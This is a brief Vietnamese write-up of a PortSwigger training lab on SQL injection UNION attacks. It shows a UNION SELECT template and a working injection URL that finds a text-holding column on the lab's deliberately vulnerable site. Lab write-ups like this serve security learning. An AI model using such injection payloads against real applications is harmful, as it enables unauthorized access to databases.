# Lab: SQL injection UNION attack, finding a column containing text

**Lab URL:** [PortSwigger Lab](https://portswigger.net/web-security/union-attacks/lab-find-column-containing-text)

## Mô tả

Ở lab này, mình cần phải tìm được chuỗi theo yêu cầu của lab **'BVuEQu'**.

## Phân tích

Với UNION Attack, ta có thể tìm một cột chứa giá trị loại "string" bằng cách thử chèn đoạn string cần tìm vào:

```sql
UNION SELECT {string_can_tim},NULL,NULL--
```

{string_can_tim} có thể nằm ở bất kỳ cột nào trong database, do đó hãy thử vận may của mình bạn nhé, biết đâu những từ khóa thông dụng có thể cho ta xem được hết cả database của cột cần tìm.

## Khai thác

`Payload: "https://ac861f221ec2cb3cc0b71c46008a00b5.web-security-academy.net/filter?category=Gifts%27+UNION+SELECT+NULL,%27BVuEQu%27,NULL--"`

## Kết quả

![Solved SQLi finding column](sqli-union-attack/solved-union-attack-finding-column.jpg)
